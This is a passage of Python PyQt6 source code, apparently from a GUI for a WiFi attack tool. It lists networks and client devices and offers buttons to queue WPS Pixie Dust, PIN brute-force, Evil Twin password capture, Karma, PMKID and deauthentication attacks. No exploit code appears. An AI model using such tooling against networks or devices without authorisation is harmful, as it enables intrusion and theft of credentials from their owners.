            item.setText(1, f"CLIENT {signal_bars}")  # Info
        # Color the Info column with signal color
        item.setForeground(1, QBrush(QColor(signal_color)))

        item.setText(2, f"{client.device_type} ({client.device_confidence}%)")  # Device Type
        item.setText(3, "")  # Channel
        item.setText(4, "")  # Encryption

        # Power column - just show dBm value
        item.setText(5, f"{power_value} dBm")

        item.setText(6, "")  # Attack Score (N/A for clients)
        item.setText(7, "")  # WPS (N/A for clients)
        item.setText(8, str(client.packets))  # Packets

        # Show all probed ESSIDs in the designated column
        all_probes = client.to_dict()['probed_essids']
        item.setText(9, all_probes if all_probes else "No probes")  # Probed ESSIDs

        item.setText(10, client.first_seen or "")  # First Seen
        item.setText(11, client.last_seen or "")  # Last Seen

        self.client_tree_items[client.mac] = item

        # Expand parent to show client
        if parent_item:
            parent_item.setExpanded(True)

        # Move the network to "Networks with Clients" category now that it has a client
        self.move_network_to_correct_category(bssid)

        # Update count
        self.client_count_label.setText(f"Clients: {len(self.client_tree_items)}")

        # Save to database
        self.save_client_to_database(client, bssid)

    def save_client_to_database(self, client, bssid: str):
        """Save or update client in database"""
        try:
            from src.database.models import get_session, Client, Network
            from datetime import datetime
            import json

            session = get_session()

            # Check if client already exists
            db_client = session.query(Client).filter_by(mac_address=client.mac).first()

            # Handle associated networks (stored as JSON array of BSSIDs)
            associated_networks = []
            if bssid and bssid != "(not associated)" and bssid.strip():
                # Verify network exists in database
                network = session.query(Network).filter_by(bssid=bssid).first()
                if network:
                    associated_networks = [bssid]

            if db_client is None:
                # Create new client record
                db_client = Client(
                    mac_address=client.mac,
                    manufacturer=client.vendor,
                    device_type=client.device_type,
                    first_seen=datetime.now(),
                    associated_networks=json.dumps(associated_networks) if associated_networks else None
                )
                session.add(db_client)
            else:
                # Update existing client
                db_client.manufacturer = client.vendor
                db_client.device_type = client.device_type
                db_client.last_seen = datetime.now()

                # Update associated networks - merge with existing
                if associated_networks:
                    existing = []
                    if db_client.associated_networks:
                        try:
                            existing = json.loads(db_client.associated_networks)
                        except:
                            existing = []

                    # Add new BSSID if not already present
                    if bssid not in existing:
                        existing.append(bssid)

                    db_client.associated_networks = json.dumps(existing)

            session.commit()
            session.close()

        except Exception as e:
            print(f"[ERROR] Failed to save client to database: {e}")
            import traceback
            traceback.print_exc()

    def on_client_updated(self, client, bssid: str):
        """Handle client data updated"""
        if client.mac in self.client_tree_items:
            item = self.client_tree_items[client.mac]

            # Check if this is an unassociated client
            is_unassociated = not bssid or bssid == "(not associated)" or bssid.strip() == ""

            # MAC with vendor and signal bars attached
            vendor_display = f" ({client.vendor})" if client.vendor else ""
            signal_bars, signal_color, power_value = self.get_signal_bar(client.power)
            mac_with_signal = f"{client.icon} {client.mac}{vendor_display} {signal_bars}"
            item.setText(0, mac_with_signal)
            # Color the MAC column with signal color
            from PyQt6.QtGui import QColor, QBrush
            item.setForeground(0, QBrush(QColor(signal_color)))

            # Update Info column with probes for unassociated clients
            if is_unassociated and client.probed_essids:
                probes_display = ', '.join(client.probed_essids[:3])  # Show first 3 probes
                if len(client.probed_essids) > 3:
                    probes_display += f" (+{len(client.probed_essids) - 3} more)"
                item.setText(1, f"Probing: {probes_display} {signal_bars}")
            else:
                item.setText(1, f"CLIENT {signal_bars}")
            # Color the Info column with signal color
            item.setForeground(1, QBrush(QColor(signal_color)))

            item.setText(2, f"{client.device_type} ({client.device_confidence}%)")  # Device Type

            # Power column - just show dBm value
            item.setText(5, f"{power_value} dBm")

            item.setText(8, str(client.packets))  # Packets

            # Update all probed ESSIDs
            all_probes = client.to_dict()['probed_essids']
            item.setText(9, all_probes if all_probes else "No probes")  # Probed ESSIDs

            item.setText(10, client.first_seen or "")  # First Seen
            item.setText(11, client.last_seen or "")  # Last Seen

            # Save to database
            self.save_client_to_database(client, bssid)

    def set_main_window(self, main_window):
        """Set reference to main window for accessing other tabs"""
        self.main_window = main_window

    def set_unassociated_clients_tab(self, unassociated_clients_tab):
        """Set reference to unassociated clients tab for forwarding client data"""
        self.unassociated_clients_tab = unassociated_clients_tab

    def add_to_auto_attack_queue(self, bssid: str):
        """
        Add selected network to auto attack queue

        Args:
            bssid: BSSID of the network to add
        """
        try:
            # Get AP details from tree
            if bssid not in self.ap_tree_items:
                self.log(f"⚠️  Network {bssid} not found in tree")
                QMessageBox.warning(self, "Network Not Found",
                                  f"Could not find network {bssid} in scanner results.")
                return

            item = self.ap_tree_items[bssid]

            # Extract data from tree item
            # Tree columns: BSSID, SSID, Vendor, Channel, Privacy, Cipher, Auth, Power, Beacons, Data, Clients, Score, First Seen
            ssid = item.text(1) if item.text(1) else "(Hidden)"
            channel = item.text(3)
            encryption = item.text(4)  # Privacy column
            wps_enabled = "WPS" in item.text(6).upper()  # Auth column

            # Extract attack score (format: "XX.XX (LEVEL)")
            score_text = item.text(11)
            try:
                attack_score = float(score_text.split()[0])
            except (ValueError, IndexError):
                attack_score = 0.0

            # Check if this is a historical item (not yet seen in live scan)
            if hasattr(self, 'historical_aps') and bssid in self.historical_aps:
                reply = QMessageBox.warning(
                    self,
                    "⚠️ Targeting Historical Network",
                    f"⚠️ WARNING: You are targeting a HISTORICAL network.\n\n"
                    f"Network: {ssid}\n"
                    f"BSSID: {bssid}\n\n"
                    f"This network was loaded from the database but has NOT been detected in the current live scan.\n"
                    f"It may be offline, out of range, or no longer exist.\n\n"
                    f"📚 Historical networks are shown with a 📜 scroll icon and semi-transparent text.\n\n"
                    f"Do you want to add this historical network to the attack queue anyway?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.No:
                    self.log(f"❌ Cancelled targeting historical network: {ssid} [{bssid}]")
                    return

                self.log(f"⚠️  User chose to target historical network: {ssid} [{bssid}]")

            # Add to auto attack queue
            if hasattr(self, 'main_window') and hasattr(self.main_window, 'auto_attack_tab'):
                # Check if queue_target method exists
                auto_attack_tab = self.main_window.auto_attack_tab
                if hasattr(auto_attack_tab, 'queue_target'):
                    auto_attack_tab.queue_target(
                        bssid=bssid,
                        ssid=ssid,
                        encryption=encryption,
                        channel=channel
                    )

                    self.log(f"✅ Added {ssid} [{bssid}] to Auto Attack Queue (Score: {attack_score})")

                    # Show confirmation message
                    QMessageBox.information(
                        self,
                        "Added to Queue",
                        f"Network '{ssid}' has been added to the Auto Attack Queue.\n\n"
                        f"BSSID: {bssid}\n"
                        f"Attack Score: {attack_score}/100\n"
                        f"Encryption: {encryption}"
                    )
                else:
                    self.log("⚠️  Auto Attack Queue not available")
                    QMessageBox.warning(self, "Feature Not Available",
                                      "Auto Attack Queue is not available in this version.")
            else:
                self.log("⚠️  Cannot access Auto Attack tab")
                QMessageBox.warning(self, "Error",
                                  "Cannot access Auto Attack tab. Please try restarting the application.")

        except Exception as e:
            self.log(f"❌ Error adding to queue: {e}")
            import traceback
            traceback.print_exc()
            QMessageBox.critical(self, "Error", f"Failed to add network to queue:\n{e}")

    def attack_in_manual_mode(self, bssid: str):
        """
        Switch to Manual Attack tab and pre-populate with selected network

        Args:
            bssid: BSSID of the network to attack
        """
        try:
            # Get AP details from tree
            if bssid not in self.ap_tree_items:
                self.log(f"⚠️  Network {bssid} not found in tree")
                QMessageBox.warning(self, "Network Not Found",
                                  f"Could not find network {bssid} in scanner results.")
                return

            item = self.ap_tree_items[bssid]

            # Extract data from tree item
            ssid = item.text(1) if item.text(1) else "(Hidden)"
            channel = item.text(3)
            encryption = item.text(4)  # Privacy column

            # Check if this is a historical item (not yet seen in live scan)
            if hasattr(self, 'historical_aps') and bssid in self.historical_aps:
                reply = QMessageBox.warning(
                    self,
                    "⚠️ Targeting Historical Network",
                    f"⚠️ WARNING: You are targeting a HISTORICAL network.\n\n"
                    f"Network: {ssid}\n"
                    f"BSSID: {bssid}\n\n"
                    f"This network was loaded from the database but has NOT been detected in the current live scan.\n"
                    f"It may be offline, out of range, or no longer exist.\n\n"
                    f"📚 Historical networks are shown with a 📜 scroll icon and semi-transparent text.\n\n"
                    f"Do you want to target this historical network in Manual Attack mode anyway?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.No:
                    self.log(f"❌ Cancelled manual attack on historical network: {ssid} [{bssid}]")
                    return

                self.log(f"⚠️  User chose to manually attack historical network: {ssid} [{bssid}]")

            # Get monitor interface
            interface = self.monitor_interface if self.monitor_interface else "wlan0mon"

            # Load target into manual attack tab
            if hasattr(self, 'main_window') and hasattr(self.main_window, 'manual_attack_tab'):
                manual_attack_tab = self.main_window.manual_attack_tab

                # Check if load_target method exists
                if hasattr(manual_attack_tab, 'load_target'):
                    # Load target data
                    manual_attack_tab.load_target(
                        bssid=bssid,
                        ssid=ssid,
                        channel=channel,
                        encryption=encryption
                    )

                    # Set interface if available
                    if hasattr(manual_attack_tab, 'interface_input'):
                        manual_attack_tab.interface_input.setText(interface)

                    # Switch to Manual Attack tab
                    if hasattr(self.main_window, 'tabs'):
                        # Find the index of the manual attack tab
                        for i in range(self.main_window.tabs.count()):
                            if self.main_window.tabs.widget(i) == manual_attack_tab:
                                self.main_window.tabs.setCurrentIndex(i)
                                break

                    self.log(f"⚔️  Loaded {ssid} [{bssid}] into Manual Attack tab")

                    # Show brief notification
                    self.main_window.status_bar.showMessage(
                        f"Manual Attack tab loaded with target: {ssid} [{bssid}]",
                        5000
                    )
                else:
                    self.log("⚠️  Manual Attack tab load_target method not available")
                    QMessageBox.warning(self, "Feature Not Available",
                                      "Manual Attack tab target loading is not available.")
            else:
                self.log("⚠️  Cannot access Manual Attack tab")
                QMessageBox.warning(self, "Error",
                                  "Cannot access Manual Attack tab. Please try restarting the application.")

        except Exception as e:
            self.log(f"❌ Error loading manual attack: {e}")
            import traceback
            traceback.print_exc()
            QMessageBox.critical(self, "Error", f"Failed to load network into manual attack:\n{e}")


class WPSNetworksTab(QWidget):
    """WPS Networks tab - focused on WPS-enabled vulnerable networks"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.wps_aps = {}  # Store WPS AP data: {bssid: ap_data}
        self.init_ui()

    @staticmethod
    def channel_to_frequency(channel_str: str) -> str:
        """
        Convert WiFi channel to frequency

        Args:
            channel_str: Channel number as string

        Returns:
            Formatted string with channel and frequency (e.g., "6 (2437 MHz)")
        """
        try:
            channel = int(channel_str.strip())

            # 2.4 GHz band (channels 1-14)
            if 1 <= channel <= 14:
                freq_mhz = 2407 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            # 5 GHz band (channels 36-165)
            elif 36 <= channel <= 165:
                freq_mhz = 5000 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            # 6 GHz band (channels 1-233)
            elif 233 < channel <= 255:
                freq_mhz = 5955 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            else:
                return str(channel)

        except (ValueError, AttributeError):
            return str(channel_str)

    def init_ui(self):
        """Initialize WPS Networks tab UI"""
        layout = QVBoxLayout()

        # Header
        header = QLabel("🔓 WPS-Enabled Networks")
        header.setProperty("heading", True)
        layout.addWidget(header)

        info = QLabel("Networks with WiFi Protected Setup (WPS) enabled - Prime targets for PIN attacks")
        layout.addWidget(info)

        # Statistics panel
        stats_layout = QHBoxLayout()

        self.total_wps_label = QLabel("Total WPS: 0")
        self.total_wps_label.setStyleSheet("font-weight: bold; color: #ff6600;")
        stats_layout.addWidget(self.total_wps_label)

        self.vulnerable_label = QLabel("Vulnerable: 0")
        self.vulnerable_label.setStyleSheet("font-weight: bold; color: #ff0000;")
        stats_layout.addWidget(self.vulnerable_label)

        self.locked_label = QLabel("Locked: 0")
        self.locked_label.setStyleSheet("font-weight: bold; color: #00aa00;")
        stats_layout.addWidget(self.locked_label)

        stats_layout.addStretch()
        layout.addLayout(stats_layout)

        # Quick attack buttons
        attack_buttons_layout = QHBoxLayout()

        self.pixie_dust_btn = QPushButton("💨 Pixie Dust Attack")
        self.pixie_dust_btn.setToolTip("Fast WPS attack using Pixie Dust vulnerability")
        self.pixie_dust_btn.clicked.connect(self.launch_pixie_dust_attack)
        attack_buttons_layout.addWidget(self.pixie_dust_btn)

        self.pin_brute_btn = QPushButton("🔢 PIN Brute Force")
        self.pin_brute_btn.setToolTip("Brute force WPS PIN (slow but thorough)")
        self.pin_brute_btn.clicked.connect(self.launch_pin_brute_force)
        attack_buttons_layout.addWidget(self.pin_brute_btn)

        self.null_pin_btn = QPushButton("🎯 NULL PIN Attack")
        self.null_pin_btn.setToolTip("Try empty/null PIN (quick check)")
        self.null_pin_btn.clicked.connect(self.launch_null_pin_attack)
        attack_buttons_layout.addWidget(self.null_pin_btn)

        attack_buttons_layout.addStretch()
        layout.addLayout(attack_buttons_layout)

        # WPS networks tree
        self.wps_tree = QTreeWidget()
        self.wps_tree.setHeaderLabels([
            "BSSID", "SSID", "Vendor", "Channel", "Power (dBm)",
            "WPS Version", "WPS Locked", "Manufacturer", "Model",
            "Beacons", "Last Seen", "Attack Score"
        ])

        # Set column widths
        self.wps_tree.setColumnWidth(0, 150)  # BSSID
        self.wps_tree.setColumnWidth(1, 200)  # SSID
        self.wps_tree.setColumnWidth(2, 150)  # Vendor
        self.wps_tree.setColumnWidth(3, 80)   # Channel
        self.wps_tree.setColumnWidth(4, 100)  # Power
        self.wps_tree.setColumnWidth(5, 100)  # WPS Version
        self.wps_tree.setColumnWidth(6, 100)  # WPS Locked
        self.wps_tree.setColumnWidth(7, 150)  # Manufacturer
        self.wps_tree.setColumnWidth(8, 150)  # Model
        self.wps_tree.setColumnWidth(9, 80)   # Beacons
        self.wps_tree.setColumnWidth(10, 150) # Last Seen
        self.wps_tree.setColumnWidth(11, 120) # Attack Score

        self.wps_tree.setAlternatingRowColors(True)
        self.wps_tree.setSortingEnabled(True)
        self.wps_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.wps_tree.customContextMenuRequested.connect(self.show_wps_context_menu)

        layout.addWidget(self.wps_tree)

        # Activity log
        log_label = QLabel("Activity Log:")
        layout.addWidget(log_label)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setMaximumHeight(150)
        layout.addWidget(self.log_text)

        self.setLayout(layout)
        self.log("✓ WPS Networks tab initialized - waiting for WPS-enabled networks...")

    def log(self, message: str):
        """Add message to activity log"""
        from datetime import datetime
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.append(f"[{timestamp}] {message}")

    def add_wps_network(self, bssid: str, ap_data: dict):
        """
        Add or update a WPS-enabled network

        Args:
            bssid: MAC address of the AP
            ap_data: Dictionary with AP information
        """
        from datetime import datetime
        from PyQt6.QtWidgets import QTreeWidgetItem

        # Store the AP data
        self.wps_aps[bssid] = ap_data

        # Check if already exists
        existing_item = None
        for i in range(self.wps_tree.topLevelItemCount()):
            item = self.wps_tree.topLevelItem(i)
            if item.text(0) == bssid:
                existing_item = item
                break

        # Create or update item
        if existing_item:
            item = existing_item
        else:
            item = QTreeWidgetItem()
            self.wps_tree.addTopLevelItem(item)

        # Populate columns
        item.setText(0, bssid)
        item.setText(1, ap_data.get('ssid', '(Hidden)'))
        item.setText(2, ap_data.get('vendor', 'Unknown'))
        item.setText(3, self.channel_to_frequency(str(ap_data.get('channel', 'N/A'))))
        item.setText(4, str(ap_data.get('power', 'N/A')))
        item.setText(5, ap_data.get('wps_version', '1.0'))
        item.setText(6, '🔒 Yes' if ap_data.get('wps_locked', False) else '🔓 No')
        item.setText(7, ap_data.get('manufacturer', 'Unknown'))
        item.setText(8, ap_data.get('model', 'Unknown'))
        item.setText(9, str(ap_data.get('beacons', 0)))
        item.setText(10, datetime.now().strftime("%H:%M:%S"))
        item.setText(11, f"{ap_data.get('attack_score', 100.0):.1f}")

        # Color code by attack score
        score = ap_data.get('attack_score', 100.0)
        from PyQt6.QtGui import QBrush, QColor
        if score >= 90:
            color = QColor(255, 100, 100)  # Red - Easy target
        elif score >= 70:
            color = QColor(255, 200, 100)  # Orange
        else:
            color = QColor(200, 200, 200)  # Gray - Harder target

        for col in range(self.wps_tree.columnCount()):
            item.setForeground(col, QBrush(color))

        # Update statistics
        self.update_statistics()

        if not existing_item:
            self.log(f"🔓 New WPS network: {ap_data.get('ssid', '(Hidden)')} [{bssid}]")

    def update_statistics(self):
        """Update WPS statistics labels"""
        total = len(self.wps_aps)
        vulnerable = sum(1 for ap in self.wps_aps.values() if not ap.get('wps_locked', False))
        locked = sum(1 for ap in self.wps_aps.values() if ap.get('wps_locked', False))

        self.total_wps_label.setText(f"Total WPS: {total}")
        self.vulnerable_label.setText(f"Vulnerable: {vulnerable}")
        self.locked_label.setText(f"Locked: {locked}")

    def show_wps_context_menu(self, position):
        """Show context menu for WPS networks"""
        from PyQt6.QtGui import QAction

        item = self.wps_tree.itemAt(position)
        if not item:
            return

        menu = QMenu(self)
        bssid = item.text(0)

        # WPS Attack options
        pixie_action = QAction("💨 Pixie Dust Attack", self)
        pixie_action.triggered.connect(lambda: self.launch_pixie_dust_on(bssid))
        menu.addAction(pixie_action)

        pin_action = QAction("🔢 PIN Brute Force", self)
        pin_action.triggered.connect(lambda: self.launch_pin_brute_on(bssid))
        menu.addAction(pin_action)

        null_action = QAction("🎯 NULL PIN Attack", self)
        null_action.triggered.connect(lambda: self.launch_null_pin_on(bssid))
        menu.addAction(null_action)

        menu.addSeparator()

        # Queue for auto attack
        queue_action = QAction("➕ Add to Auto Attack Queue", self)
        queue_action.triggered.connect(lambda: self.add_to_queue(bssid))
        menu.addAction(queue_action)

        menu.exec(self.wps_tree.viewport().mapToGlobal(position))

    def launch_pixie_dust_attack(self):
        """Launch Pixie Dust attack on selected network"""
        selected = self.wps_tree.selectedItems()
        if selected:
            bssid = selected[0].text(0)
            self.launch_pixie_dust_on(bssid)
        else:
            self.log("⚠️ No network selected")

    def launch_pin_brute_force(self):
        """Launch PIN brute force on selected network"""
        selected = self.wps_tree.selectedItems()
        if selected:
            bssid = selected[0].text(0)
            self.launch_pin_brute_on(bssid)
        else:
            self.log("⚠️ No network selected")

    def launch_null_pin_attack(self):
        """Launch NULL PIN attack on selected network"""
        selected = self.wps_tree.selectedItems()
        if selected:
            bssid = selected[0].text(0)
            self.launch_null_pin_on(bssid)
        else:
            self.log("⚠️ No network selected")

    def launch_pixie_dust_on(self, bssid: str):
        """Launch Pixie Dust attack on specific BSSID via attack queue"""
        from PyQt6.QtWidgets import QMessageBox
        from datetime import datetime

        self.log(f"💨 Launching Pixie Dust attack on {bssid}...")

        try:
            # Get network from database
            from src.database.models import get_session, Network, AttackQueue
            from src.utils.serial import generate_serial

            session = get_session()
            network = session.query(Network).filter_by(bssid=bssid.upper()).first()

            if not network:
                QMessageBox.warning(
                    self,
                    "Network Not Found",
                    f"Could not find network {bssid} in database.\n"
                    f"Please ensure the network has been scanned."
                )
                self.log(f"⚠️ Network {bssid} not found in database")
                session.close()
                return

            # Add to attack queue
            attack_job = AttackQueue(
                serial=generate_serial("atk"),
                network_id=network.id,
                attack_type="WPS_PIXIE",
                priority=22,  # HIGHEST priority - WPS attacks always go first
                status="pending",
                added_at=datetime.utcnow(),
                retry_count=0,
                max_retries=2,
                notes=f"Pixie Dust attack added via GUI at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )

            session.add(attack_job)
            session.commit()

            attack_serial = attack_job.serial
            session.close()

            QMessageBox.information(
                self,
                "Pixie Dust Attack Queued",
                f"✓ Pixie Dust attack queued for {bssid}\n\n"
                f"Attack ID: {attack_serial}\n"
                f"The orchestrator will process this attack.\n"
                f"This may take 2-10 minutes.\n\n"
                f"Check the Attack Queue tab for progress."
            )
            self.log(f"✓ Pixie Dust attack queued on {bssid} ({attack_serial})")

        except Exception as e:
            QMessageBox.critical(
                self,
                "Error",
                f"Error queuing attack:\n{e}\n\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            self.log(f"⚠️ Error queuing attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {e}")
            import traceback
            traceback.print_exc()

    def launch_pin_brute_on(self, bssid: str):
        """Launch PIN brute force on specific BSSID"""
        self.log(f"🔢 Launching PIN brute force on {bssid}...")
        QMessageBox.information(self, "Attack Launched",
                              f"PIN brute force on {bssid}\n\n"
                              f"This will be implemented with reaver/bully integration.")

    def launch_null_pin_on(self, bssid: str):
        """Launch NULL PIN attack on specific BSSID"""
        self.log(f"🎯 Launching NULL PIN attack on {bssid}...")
        QMessageBox.information(self, "Attack Launched",
                              f"NULL PIN attack on {bssid}\n\n"
                              f"This will be implemented with reaver/bully integration.")

    def add_to_queue(self, bssid: str):
        """Add WPS network to auto attack queue"""
        self.log(f"➕ Adding {bssid} to Auto Attack Queue...")
        QMessageBox.information(self, "Added to Queue",
                              f"Network {bssid} added to Auto Attack Queue.")


class UnassociatedClientsTab(QWidget):
    """Unassociated Clients tab - focused on rogue client attacks"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = None  # Will be set by MainWindow
        self.client_tree_items = {}  # MAC -> QTreeWidgetItem
        self.init_ui()

    def init_ui(self):
        """Initialize unassociated clients UI"""
        layout = QVBoxLayout()

        # Header
        header = QLabel("Unassociated Clients - Rogue Device Detection & Attacks")
        header.setProperty("heading", True)
        layout.addWidget(header)

        info = QLabel(
            "Track unassociated clients (devices not connected to any AP) and perform targeted attacks.\n"
            "These devices are actively probing for networks and are vulnerable to Evil Twin, Karma, and Rogue AP attacks."
        )
        info.setWordWrap(True)
        layout.addWidget(info)

        # Statistics panel
        stats_layout = QHBoxLayout()

        stats_group1 = QGroupBox("📊 Statistics")
        stats_inner = QHBoxLayout()
        self.total_clients_label = QLabel("Total: 0")
        self.total_clients_label.setStyleSheet("font-size: 14px; font-weight: bold;")
        stats_inner.addWidget(self.total_clients_label)

        self.probing_clients_label = QLabel("Probing: 0")
        self.probing_clients_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #ff9900;")
        stats_inner.addWidget(self.probing_clients_label)

        self.vulnerable_label = QLabel("Vulnerable: 0")
        self.vulnerable_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #ff0000;")
        stats_inner.addWidget(self.vulnerable_label)
        stats_group1.setLayout(stats_inner)
        stats_layout.addWidget(stats_group1)

        # Quick actions
        actions_group = QGroupBox("⚡ Quick Actions")
        actions_inner = QHBoxLayout()

        self.evil_twin_btn = QPushButton("🎭 Evil Twin Attack")
        self.evil_twin_btn.setToolTip("Create fake AP matching probed ESSID")
        self.evil_twin_btn.clicked.connect(self.launch_evil_twin_attack)
        actions_inner.addWidget(self.evil_twin_btn)

        self.karma_btn = QPushButton("🃏 Karma Attack")
        self.karma_btn.setToolTip("Respond to all probe requests")
        self.karma_btn.clicked.connect(self.launch_karma_attack)
        actions_inner.addWidget(self.karma_btn)

        self.deauth_btn = QPushButton("💥 Deauth Attack")
        self.deauth_btn.setToolTip("Force disconnect from AP")
        self.deauth_btn.clicked.connect(self.launch_deauth_attack)
        actions_inner.addWidget(self.deauth_btn)

        actions_group.setLayout(actions_inner)
        stats_layout.addWidget(actions_group)

        layout.addLayout(stats_layout)

        # Client tree
        clients_group = QGroupBox("Unassociated Clients")
        clients_layout = QVBoxLayout()

        self.clients_tree = QTreeWidget()
        self.clients_tree.setHeaderLabels([
            "MAC Address", "Vendor", "Device Type", "Probed ESSIDs",
            "Power (dBm)", "Packets", "First Seen", "Last Seen"
        ])
        self.clients_tree.setAlternatingRowColors(True)
        self.clients_tree.setSortingEnabled(True)
        self.clients_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.clients_tree.customContextMenuRequested.connect(self.show_context_menu)
        clients_layout.addWidget(self.clients_tree)

        clients_group.setLayout(clients_layout)
        layout.addWidget(clients_group)

        # Attack details panel
        details_group = QGroupBox("Attack Configuration")
        details_layout = QVBoxLayout()

        # Target selection
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target MAC:"))
        self.target_mac_input = QLineEdit()
        self.target_mac_input.setPlaceholderText("Select a client from the list above")
        self.target_mac_input.setReadOnly(True)
        target_layout.addWidget(self.target_mac_input)
        details_layout.addLayout(target_layout)

        # Target ESSID (for Evil Twin)
        essid_layout = QHBoxLayout()
        essid_layout.addWidget(QLabel("Target ESSID:"))
        self.target_essid_combo = QComboBox()
        self.target_essid_combo.setEditable(True)
        self.target_essid_combo.setPlaceholderText("Select from probed ESSIDs")
        essid_layout.addWidget(self.target_essid_combo)
        details_layout.addLayout(essid_layout)

        # Attack buttons
        attack_buttons_layout = QHBoxLayout()

        self.launch_evil_twin_btn = QPushButton("🎭 Launch Evil Twin")
        self.launch_evil_twin_btn.clicked.connect(self.launch_evil_twin_attack)
        attack_buttons_layout.addWidget(self.launch_evil_twin_btn)

        self.launch_karma_btn = QPushButton("🃏 Launch Karma")
        self.launch_karma_btn.clicked.connect(self.launch_karma_attack)
        attack_buttons_layout.addWidget(self.launch_karma_btn)

        self.launch_deauth_btn = QPushButton("💥 Launch Deauth")
        self.launch_deauth_btn.clicked.connect(self.launch_deauth_attack)
        attack_buttons_layout.addWidget(self.launch_deauth_btn)

        attack_buttons_layout.addStretch()
        details_layout.addLayout(attack_buttons_layout)

        details_group.setLayout(details_layout)
        layout.addWidget(details_group)

        # Log area
        log_group = QGroupBox("Activity Log")
        log_layout = QVBoxLayout()

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setMaximumHeight(150)
        self.log_text.setFontFamily("monospace")
        log_layout.addWidget(self.log_text)

        log_group.setLayout(log_layout)
        layout.addWidget(log_group)

        self.setLayout(layout)

        # Initial log message
        self.log("👁️  Unassociated Clients tab initialized")
        self.log("🔍 Waiting for scan data...")

    def log(self, message: str):
        """Add message to log"""
        from datetime import datetime
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_text.append(f"[{timestamp}] {message}")

    def update_statistics(self):
        """Update statistics labels"""
        total = self.clients_tree.topLevelItemCount()
        probing = 0
        vulnerable = 0

        for i in range(total):
            item = self.clients_tree.topLevelItem(i)
            probed_essids = item.text(3)
            if probed_essids and probed_essids != "No probes":
                probing += 1
                # Vulnerable if probing for specific networks
                if len(probed_essids.split(',')) > 0:
                    vulnerable += 1

        self.total_clients_label.setText(f"Total: {total}")
        self.probing_clients_label.setText(f"Probing: {probing}")
        self.vulnerable_label.setText(f"Vulnerable: {vulnerable}")

    def add_client(self, client, bssid: str = ""):
        """Add or update a client in the tree"""
        if client.mac not in self.client_tree_items:
            # Create new item
            item = QTreeWidgetItem()
            self.client_tree_items[client.mac] = item
            self.clients_tree.addTopLevelItem(item)

        item = self.client_tree_items[client.mac]

        # Update columns
        vendor_display = f" ({client.vendor})" if client.vendor else ""
        item.setText(0, f"{client.icon} {client.mac}{vendor_display}")
        item.setText(1, client.vendor or "Unknown")
        item.setText(2, f"{client.device_type} ({client.device_confidence}%)")

        # Probed ESSIDs - critical for attacks!
        probes = client.to_dict().get('probed_essids', "No probes")
        item.setText(3, probes if probes else "No probes")

        item.setText(4, client.power)
        item.setText(5, str(client.packets))
        item.setText(6, client.first_seen or "")
        item.setText(7, client.last_seen or "")

        # Update statistics
        self.update_statistics()

    def show_context_menu(self, position):
        """Show smart context menu for client with relevant attacks"""
        from PyQt6.QtGui import QAction

        item = self.clients_tree.itemAt(position)
        if not item:
            return

        menu = QMenu(self)

        # Extract client info
        mac_text = item.text(0)
        mac = mac_text.split()[-1] if " " in mac_text else mac_text
        probes_text = item.text(3)  # Probed ESSIDs
        power = item.text(4)

        # Parse probed networks
        has_probes = probes_text and probes_text != "No probes"
        probed_networks = []
        if has_probes:
            probed_networks = [e.strip() for e in probes_text.split(',') if e.strip()]

        # Set as target
        set_target_action = QAction("🎯 Set as Primary Target", self)
        set_target_action.triggered.connect(lambda: self.set_target_client(item))
        menu.addAction(set_target_action)

        menu.addSeparator()

        # ========== SMART QUICK ATTACKS ==========
        # Only show attacks that make sense for this client

        if has_probes and len(probed_networks) > 0:
            # Client is probing for specific networks - show targeted attacks

            # Create submenu for each probed network
            for essid in probed_networks[:5]:  # Limit to first 5 to avoid huge menu
                network_menu = menu.addMenu(f"📡 Target: {essid}")

                # Capture password via Evil Twin
                evil_twin_action = QAction(f"🎭 Capture Password (Evil Twin)", self)
                evil_twin_action.setToolTip(f"Create fake AP '{essid}' to capture password when {mac} connects")
                evil_twin_action.triggered.connect(lambda checked, e=essid, m=mac: self.quick_capture_password_evil_twin(m, e))
                network_menu.addAction(evil_twin_action)

                # PMKID attack if network exists
                pmkid_action = QAction(f"🔑 PMKID Attack", self)
                pmkid_action.setToolTip(f"Attempt PMKID capture on '{essid}' (no client interaction needed)")
                pmkid_action.triggered.connect(lambda checked, e=essid: self.quick_pmkid_attack(e))
                network_menu.addAction(pmkid_action)

                # Deauth + Handshake
                handshake_action = QAction(f"📡 Force Reconnect + Capture Handshake", self)
                handshake_action.setToolTip(f"Deauth {mac} from '{essid}' and capture handshake on reconnect")
                handshake_action.triggered.connect(lambda checked, e=essid, m=mac: self.quick_deauth_and_capture(m, e))
                network_menu.addAction(handshake_action)

            menu.addSeparator()

        # Karma attack (works for all clients, especially those probing)
        karma_action = QAction("🃏 Karma Attack (Respond to All Probes)", self)
        karma_action.setToolTip("Create fake APs for all networks this client probes for")
        karma_action.triggered.connect(lambda: self.quick_karma_attack(mac))
        menu.addAction(karma_action)

        # Deauth only (if client has strong signal)
        try:
            power_val = int(power.strip())
            if power_val > -70:  # Strong signal
                deauth_action = QAction("💥 Deauth Client", self)
                deauth_action.setToolTip(f"Disconnect {mac} from associated AP")
                deauth_action.triggered.connect(lambda: self.main_window.quick_deauth_client(mac) if self.main_window else None)
                menu.addAction(deauth_action)
        except (ValueError, AttributeError):
            pass

